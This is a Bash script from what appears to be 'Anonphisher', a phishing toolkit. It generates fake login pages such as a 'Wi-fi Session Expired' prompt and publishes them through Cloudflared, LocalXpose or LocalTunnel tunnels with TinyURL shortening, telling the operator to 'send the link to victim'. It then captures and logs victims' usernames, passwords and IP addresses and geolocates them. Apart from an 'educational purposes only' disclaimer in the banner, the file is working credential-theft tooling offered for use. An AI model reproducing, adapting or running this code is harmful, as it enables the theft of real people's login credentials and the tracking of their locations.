printf "\e[1;31m             +-+-+-+-+-+-+-+-+-+-+-+  \e[0m\n"
printf "\e${White}            |A|n|o|n|p|h|i|s|h|e|r|  \e[0m\n"
printf "\e[1;33m             +-+-+-+-+-+-+-+-+-+-+-+  \e[0m\n"
printf "\e[1;34m         \e[0m\e[1;35m     ${RED}Version : ${CYAN}${__version__} \e[0m\n"
printf "\n"
printf "\e[1;93m  [*]\e[0m\e[1;67m Automated phishing tool by: AnonyminHack5 [51+ templates] \e[0m\e[1;93m[*]\e[0m\n"
printf "\e[1;93m     [*]\e[0m\e[1;37m Team: TermuxHackz Society \e[0m\e[1;93m[*]\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not::\e[0m\n"
printf "  \e[101m\e[1;77m:: Responsible for any misuse or damage caused by anonphisher take care please !::\e[0m\n"
printf "  \e[101m\e[1;77m:: NOTE: Only for Educational Purposes::\e[0m\n"
printf "\n"
}

smallbanner() {
clear                                               
printf "\e[1;31m  _____                 _   _     _             \e[0m\n"       
printf "\e[1;32m |  _  |___ ___ ___ ___| |_|_|___| |_ ___ ___   \e[0m\n"
printf "\e[1;33m |     |   | . |   | . |   | |_ -|   | -_|  _|  \e[0m\n"
printf "\e[1;34m |__|__|_|_|___|_|_|  _|_|_|_|___|_|_|___|_|    \e[0m\n"
printf "\e[1;35m                   |_|                          \e[0m\n"
printf "\n"
} 

createpage() {
default_cap1="Wi-fi Session Expired , Try again"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<head>" >> sites/create/login.html
printf '<meta name="viewport" content="width=device-width, initial-scale=1"/>' >> sites/create/login.html
IFS=$'\n'
printf '<link href="https://fonts.googleapis.com/css?family=Chivo:300,700|Playfair+Display:700i" rel="stylesheet">' >> sites/create/login.html
IFS=$'\n'
printf '<link rel="stylesheet" href="style.css"/>' >> sites/create/login.html
IFS=$'\n'
printf '<link rel="stylesheet" href="cookieconsent.min.css"/>' >> sites/create/login.html
IFS=$'\n'
printf '  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>' >> sites/create/login.html
IFS=$'\n'
printf '  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>' >> sites/create/login.html
IFS=$'\n'
  printf '<!-- Add boot strap framrworks -->' >> sites/create/login.html
  IFS=$'\n'
  	printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">' >> sites/create/login.html
  	IFS=$'\n'
printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" href="./style.css">' >> sites/create/login.html
IFS=$'\n'
  printf '<!-- Add icon library -->' >> sites/create/login.html
  IFS=$'\n'
printf '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">' >> sites/create/login.html
IFS=$'\n'
echo "</head>" >> sites/create/login.html
printf '<body bgcolor="gray" text="white">' >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
kill $(lsof -t -i :5555)
exit 1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Awaiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

}
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf sites/"$website"/* .termuxhackz/www
	cp -f sites/ip.php .termuxhackz/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .termuxhackz/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}


tunnel_menu() {

if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

if [[ -d .termuxhackz/www ]]; then
rm -rf .termuxhackz/www
mkdir .termuxhackz/www
else
mkdir .termuxhackz/www
fi

cp -rf sites/$website/* .termuxhackz/www
cp -f sites/ip.php .termuxhackz/www/

def_tunnel_menu="2"
smallbanner
printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m CloudFlare \e[0m\n"
printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalTunnel \e[0m\e[91m[\e[0m\e[93mNEW\e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m00\e[0m\e[91m]\e[0m\e[93m Go Back\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_loclx
elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
start_cloudflare
elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
start_localtunnel
elif [[ $tunnel_menu == 00 || $tunnel_menu == 0 ]]; then
go_back

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
clear
banner
menu
fi

}
go_back() {
	clear
	banner
	menu
}

start_cloudflare() {
	
	echo -ne "\n${RED} [${WHITE}-${RED}]${GREEN} Starting port forwarding by Cloudflared${BLUE}"
	sleep 1
	rm .cld.log > /dev/null 2>&1 &
	echo ""
			cusport
			echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing....${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
			{ sleep 1; setup_site; }
			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared...."

			if [[ `command -v termux-chroot` ]]; then
				sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
			else
				sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
			fi

			sleep 8
			cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")

			if [ -z "$cldflr_url" ]; then
        		echo -e "\n\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m\e[1;91m Failed to create a link to send.\e[0m\n"
        		exit 1
    		else
        		smallbanner
        		printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $cldflr_url

        		datafound
			fi
}

start_localhost() {

printf "\e[0m\n"
cusport
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://${HOST}:${PORT} \e[0m\e[1;92m)\e[0m\n"
setup_site 
sleep 1
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at:\e[0m\e[1;93m http://$HOST:$PORT\e[0m\n"

datafound

}

start_localtunnel() {
    printf "\e[0m\n"
    if ! command -v lt &> /dev/null; then
        printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m LocalTunnel is not installed. Install it... \e[0m\n"
        exit 1
    fi

	cusport
    printf "\n\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Starting Local Web Server...\e[0m\n"
    { sleep 3; setup_site; }

    printf "\n\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Using Localtunnel to create a public link for your local web server...\e[0m\e[91m\n[\e[0m\e[93mThis will take some time for it to start, Please be patient or go do something else \e[0m\e[91m]\e[0m\n"
    sleep 5
    url=$(lt --port 5555 --print-requests --log debug | grep -o 'https://.*$')
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Shortening the Localtunnel URL...\e[0m\n"
    sleep 3
    short_url=$(curl -s -X POST -d "url=$url" https://tinyurl.com/api-create.php)
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Sending a GET request to the Localtunnel URL with the bypass-tunnel-header...\e[0m\n"
    sleep 2
    curl -H "bypass-tunnel-reminder: true" $url
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Making it shareable to victim...\e[0m\n"
    sleep 3
    if [ -z "$url" ]; then
        echo -e " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m\e[1;91m Failed to create a link to send.\e[0m\n"
        exit 1
    else
        smallbanner
        printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $url

        printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Short URL: \e[0m\e[1;93m %s \n"$short_url
    
        datafound
    fi
}

localxpose_auth() {
	./.server/loclx -help >/dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token."
			sleep 2
			tunnel_menu
		} || {
			echo -n "$loclx_token" >$auth_f 2>/dev/null
		}
	}
}

start_loclx() {
cusport
echo -e "\n${RED} [${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{
		sleep 2
		setup_site
		localxpose_auth
	}
	echo -e "\n"
	read -n1 -p "${RED} [${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED} [${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ $(command -v termux-chroot) ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.server/.loclx 2>&1 &
	#sleep 1 && ./.termuxhackz/loclx.exe tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.termuxhackz/.loclx-win 2>&1 &
    else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.server/.loclx 2>&1 &
	fi

	sleep 12
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
    if [ -z "$loclx_url" ]; then
    echo -e "\n${RED} [${WHITE}-${RED}]${RED} Failed to create a link to send.\e[0m\n"
    exit 1
else
    echo ""
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $loclx_url

    datafound
fi

}


grab_ip() {

ip=$(grep -a 'IP:' .termuxhackz/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.txt\e[0m\n" $server
printf "\n"
cat .termuxhackz/www/ip.txt >> ip.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' .termuxhackz/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .termuxhackz/www/usernames.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .termuxhackz/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
printf "\n"
printf " \e[1;31m[\e[0m\e[1;93m!\e[0m\e[1;31m]\e[0m\e[1;96m If you dont see account info, Go to the saved logs and use cat command to view it \e[0m\e[1;31m[\e[0m\e[1;93m!\e[0m\e[1;31m]\e[0m\n"
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

datafound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do
if [[ -e ".termuxhackz/www/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf .termuxhackz/www/ip.txt
fi
sleep 0.75
if [[ -e ".termuxhackz/www/usernames.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
grab_creds
rm -rf .termuxhackz/www/usernames.txt
fi
sleep 0.75
done 
}
clear
banner
dependencies
check_internet
install_cloudflared
install_localxpose
sleep 3
clear
banner
menu
